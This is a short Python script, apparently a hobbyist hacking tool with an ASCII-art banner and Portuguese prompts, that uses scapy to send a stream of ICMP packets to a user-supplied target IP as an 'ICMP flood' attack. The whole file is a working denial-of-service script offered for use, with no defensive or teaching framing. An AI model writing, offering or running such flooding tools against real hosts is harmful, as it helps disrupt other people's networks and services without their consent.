import time
from scapy.all import IP, ICMP, send

def icmp_flood(target_ip, packet_count):
    print(r"""
 __________           .___
\______   \ ____   __| _/
 |       _// __ \ / __ | 
 |    |   \  ___// /_/ | 
 |____|_  /\___  >____ | 
        \/     \/     \/ 
____   ____      .__   __   .__                
\   \ /   /____  |  | |  | _|__|______   ____  
 \   Y   /\__  \ |  | |  |/ /  \_  __ \_/ __ \ 
  \     /  / __ \|  |_|    <|  ||  | \/\  ___/ 
   \___/  (____  /____/__|_ \__||__|    \___  >
               \/          \/               
---------------------------------
|  Make by Jhon                |
---------------------------------
    """)
    for _ in range(packet_count):
        packet = IP(dst=target_ip)/ICMP()
        send(packet, verbose=False)
        print(f"[+] Pacote ICMP enviado para {target_ip}")
        time.sleep(0.1)

    print("[+] Ataque ICMP concluído!")

if __name__ == "__main__":
    target_ip = input("IP do alvo: ")
    packet_count = int(input("Quantidade de pacotes: "))
    icmp_flood(target_ip, packet_count)
